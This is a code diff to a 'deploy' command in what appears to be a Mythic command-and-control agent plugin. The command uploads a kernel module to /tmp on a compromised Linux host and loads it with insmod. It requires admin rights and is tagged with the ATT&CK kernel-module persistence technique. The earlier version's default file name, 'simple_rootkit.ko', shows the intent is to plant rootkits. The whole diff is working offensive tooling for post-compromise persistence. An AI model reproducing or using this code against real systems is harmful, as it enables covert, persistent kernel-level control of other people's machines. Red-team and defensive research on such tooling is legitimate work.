@@ -10,118 +10,97 @@ class DeployArguments(TaskArguments):
         self.args = [
             CommandParameter(
                 name="file",
+                cli_name="File",
+                display_name="Kernel Module File",
                 type=ParameterType.File,
-                description="Kernel module (.ko file) to deploy",
+                description="Kernel module (.ko) file to deploy",
                 parameter_group_info=[
                     ParameterGroupInfo(
                         required=True,
-                        group_name="Default"
-                    )
-                ]
+                    ),
+                ],
             ),
-            CommandParameter(
-                name="remote_path",
-                type=ParameterType.String,
-                description="Target path where to deploy the kernel module",
-                default_value="/tmp/simple_rootkit.ko",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="Default"
-                    )
-                ]
-            )
         ]
-
+    
     async def parse_arguments(self):
         if len(self.command_line) == 0:
-            raise ValueError("Must supply arguments")
-        
+            raise Exception("Require arguments.")
+        if self.command_line[0] != "{":
+            raise Exception("Require JSON blob, but got raw command line.")
         self.load_args_from_json_string(self.command_line)
-        
-        # Ensure path has default value if not provided
-        if not self.get_arg("remote_path"):
-            self.add_arg("remote_path", "/tmp/simple_rootkit.ko")
 
 
-# Completion callback for upload subtask
 async def upload_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
-    """Handle completion of upload subtask, then create shell subtask"""
+    """Callback function that runs after the upload completes"""
     response = PTTaskCompletionFunctionMessageResponse(Success=True)
-    
-    # Check if upload was successful
-    task_status = completionMsg.TaskData.Task.Status.lower()
-    if "error" in task_status or not task_status.startswith("success"):
-        response.Success = False
-        response.TaskStatus = "error: Upload failed"
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=completionMsg.TaskData.Task.ParentTaskID,
-            Response=f"Upload subtask failed with status: {completionMsg.TaskData.Task.Status}".encode()
-        ))
-        return response
     
     try:
-        # Use a default path - we'll make this more robust in the next iteration
-        target_path = "/tmp/simple_rootkit.ko"
-        
-        # Create shell subtask for insmod using the parent task ID
-        parent_task_id = completionMsg.TaskData.Task.ParentTaskID
-        
-        shell_result = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-            TaskID=parent_task_id,
-            CommandName="shell",
-            Params=f"insmod {target_path}",
-            SubtaskCallbackFunction="shell_complete",
-            Token=completionMsg.TaskData.Task.TokenID
-        ))
-        
-        if not shell_result.Success:
+        # Check if the upload was successful
+        if not completionMsg.SubtaskData.Task.Completed:
             response.Success = False
-            response.TaskStatus = f"error: Failed to create insmod subtask: {shell_result.Error}"
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=parent_task_id,
-                Response=f"Failed to create insmod subtask: {shell_result.Error}".encode()
-            ))
-        else:
-            response.TaskStatus = f"Upload successful, executing: insmod {target_path}"
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=parent_task_id,
-                Response=f"Upload completed successfully, now running: insmod {target_path}".encode()
-            ))
+            response.TaskStatus = "error: Upload subtask did not complete"
+            await SendMythicRPCResponseCreate(
+                MythicRPCResponseCreateMessage(
+                    TaskID=completionMsg.TaskData.Task.ID,
+                    Response="Upload subtask did not complete".encode()
+                )
+            )
+            return response
             
+        if "error" in completionMsg.SubtaskData.Task.Status.lower():
+            response.Success = False
+            response.TaskStatus = f"error: Failed to upload kernel module: {completionMsg.SubtaskData.Task.Status}"
+            await SendMythicRPCResponseCreate(
+                MythicRPCResponseCreateMessage(
+                    TaskID=completionMsg.TaskData.Task.ID,
+                    Response=f"Failed to upload kernel module: {completionMsg.SubtaskData.Task.Status}".encode()
+                )
+            )
+            return response
+        
+        # Get the filename from the parent task's args
+        filename = completionMsg.TaskData.args.get_arg("filename")
+        if not filename:
+            response.Success = False
+            response.TaskStatus = "error: Could not retrieve filename from parent task"
+            await SendMythicRPCResponseCreate(
+                MythicRPCResponseCreateMessage(
+                    TaskID=completionMsg.TaskData.Task.ID,
+                    Response="Could not retrieve filename from parent task".encode()
+                )
+            )
+            return response
+            
+        remote_path = f"/tmp/{filename}"
+        
+        # Create insmod subtask - shell command expects a simple string, not JSON
+        insmod_command = f"insmod {remote_path}"
+        
+        await SendMythicRPCTaskCreateSubtask(
+            MythicRPCTaskCreateSubtaskMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                CommandName="shell",
+                Params=insmod_command  # Shell command expects string, not JSON
+            )
+        )
+        
+        # Send status update
+        await SendMythicRPCResponseCreate(
+            MythicRPCResponseCreateMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                Response=f"Kernel module uploaded to {remote_path}. Running insmod...".encode()
+            )
+        )
+        
     except Exception as e:
         response.Success = False
-        response.TaskStatus = f"error: Exception in upload completion: {str(e)}"
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=completionMsg.TaskData.Task.ParentTaskID if hasattr(completionMsg.TaskData.Task, 'ParentTaskID') else completionMsg.TaskData.Task.ID,
-            Response=f"Exception in upload completion: {str(e)}".encode()
-        ))
-        
-    return response
-
-
-# Completion callback for shell subtask  
-async def shell_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
-    """Handle completion of shell (insmod) subtask"""
-    response = PTTaskCompletionFunctionMessageResponse(Success=True)
-    
-    # Check if insmod was successful
-    task_status = completionMsg.TaskData.Task.Status.lower()
-    parent_task_id = completionMsg.TaskData.Task.ParentTaskID
-    
-    if "error" in task_status:
-        response.Success = False
-        response.TaskStatus = "error: insmod command failed"
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=parent_task_id,
-            Response=f"insmod command failed with status: {completionMsg.TaskData.Task.Status}".encode()
-        ))
-    else:
-        response.TaskStatus = "✅ Kernel module deployed successfully!"
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=parent_task_id,
-            Response="✅ Kernel module deployment completed successfully!".encode()
-        ))
+        response.TaskStatus = f"error: Exception in upload callback: {str(e)}"
+        await SendMythicRPCResponseCreate(
+            MythicRPCResponseCreateMessage(
+                TaskID=completionMsg.TaskData.Task.ID,
+                Response=f"Exception in upload callback: {str(e)}".encode()
+            )
+        )
     
     return response
 
@@ -129,104 +108,79 @@ async def shell_complete(completionMsg: PTTaskCompletionFunctionMessage) -> PTTa
 class DeployCommand(CommandBase):
     cmd = "deploy"
     needs_admin = True
-    help_cmd = "deploy"
-    description = "Deploy a kernel module by uploading and loading it with insmod"
+    help_cmd = "deploy (modal popup)"
+    description = "Deploy a kernel module by uploading it to /tmp and running insmod"
     version = 1
-    author = ""
-    attackmapping = ["T1547.006"]
+    supported_ui_features = []
+    author = "Jamie"
     argument_class = DeployArguments
-    browser_script = BrowserScript(script_name="deploy", author="@its_a_feature_")
+    attackmapping = ["T1547.006", "T1215"]  # Boot or Logon Initialization Scripts: Kernel Modules and Drivers
     attributes = CommandAttributes(
-        spawn_and_injectable=False,
-        supported_os=[SupportedOS.Linux],
-        builtin=False,
-        load_only=False,
-        suggested_command=False,
+        suggested_command=True,
+        dependencies=["upload", "shell"]
     )
-    completion_functions = {
-        "upload_complete": upload_complete,
-        "shell_complete": shell_complete
-    }
+    completion_functions = {"upload_complete": upload_complete}
 
-    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
+    async def create_go_tasking(
+            self, taskData: PTTaskMessageAllData
+    ) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
             TaskID=taskData.Task.ID,
             Success=True,
         )
         
         try:
-            # Debug: Show all available arguments
-            all_args = {}
-            for arg_name in ["file", "remote_path"]:
-                arg_value = taskData.args.get_arg(arg_name)
-                all_args[arg_name] = arg_value
+            # Get the uploaded file information
+            file_resp = await SendMythicRPCFileSearch(
+                MythicRPCFileSearchMessage(
+                    TaskID=taskData.Task.ID, 
+                    AgentFileID=taskData.args.get_arg("file")
+                )
+            )
             
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=taskData.Task.ID,
-                Response=f"[DEBUG] Raw arguments received: {all_args}".encode()
-            ))
+            if not file_resp.Success:
+                raise Exception(
+                    f"Failed to fetch uploaded file from Mythic (ID: {taskData.args.get_arg('file')}): {file_resp.Error}"
+                )
             
-            # Get arguments
-            file_uuid = taskData.args.get_arg("file")
-            target_path = taskData.args.get_arg("remote_path")
+            original_file_name = file_resp.Files[0].Filename
             
-            # Apply default if path is None, empty, or just whitespace
-            if not target_path or str(target_path).strip() == "":
-                target_path = "/tmp/simple_rootkit.ko"
-                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            # Ensure the filename ends with .ko
+            if not original_file_name.endswith('.ko'):
+                raise Exception(
+                    f"File must be a kernel module (.ko file). Got: {original_file_name}"
+                )
+            
+            # Store the filename for later use in the callback
+            taskData.args.add_arg("filename", original_file_name, type=ParameterType.String)
+            
+            # Set the remote path to /tmp/filename
+            remote_path = f"/tmp/{original_file_name}"
+            
+            # Create upload subtask with completion callback
+            # Upload command expects JSON parameters
+            await SendMythicRPCTaskCreateSubtask(
+                MythicRPCTaskCreateSubtaskMessage(
                     TaskID=taskData.Task.ID,
-                    Response=f"[DEBUG] Applied default path: {target_path}".encode()
-                ))
-            else:
-                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                    TaskID=taskData.Task.ID,
-                    Response=f"[DEBUG] Using provided path: {target_path}".encode()
-                ))
+                    CommandName="upload",
+                    Params=json.dumps({
+                        "file": taskData.args.get_arg("file"),
+                        "remote_path": remote_path
+                    }),
+                    SubtaskCallbackFunction="upload_complete"
+                )
+            )
             
-            if not file_uuid:
-                response.Success = False
-                response.Error = "No file specified for deployment"
-                return response
+            response.DisplayParams = f"Deploying kernel module: {original_file_name}"
             
-            # Store deployment info for callbacks
-            deploy_info = {
-                "file_uuid": file_uuid,
-                "target_path": target_path
-            }
-            
-            # Create upload subtask with explicit parameters
-            upload_params = {
-                "file": file_uuid,
-                "remote_path": target_path
-            }
-            
-            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-                TaskID=taskData.Task.ID,
-                Response=f"[DEBUG] Creating upload subtask with params: {json.dumps(upload_params)}".encode()
-            ))
-            
-            upload_result = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
-                TaskID=taskData.Task.ID,
-                CommandName="upload",
-                Params=json.dumps(upload_params),
-                SubtaskCallbackFunction="upload_complete",
-                Token=taskData.Task.TokenID
-            ))
-            
-            if not upload_result.Success:
-                response.Success = False
-                response.Error = f"Failed to create upload subtask: {upload_result.Error}"
-                return response
-            
-            # Update display params with deployment info for callbacks
-            response.DisplayParams = json.dumps(deploy_info)
-                
         except Exception as e:
             response.Success = False
-            response.Error = f"Exception in deploy task creation: {str(e)}"
+            response.Error = str(e)
             
         return response
-
-    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+    
+    async def process_response(
+        self, task: PTTaskMessageAllData, response: any
+    ) -> PTTaskProcessResponseMessageResponse:
         resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
         return resp
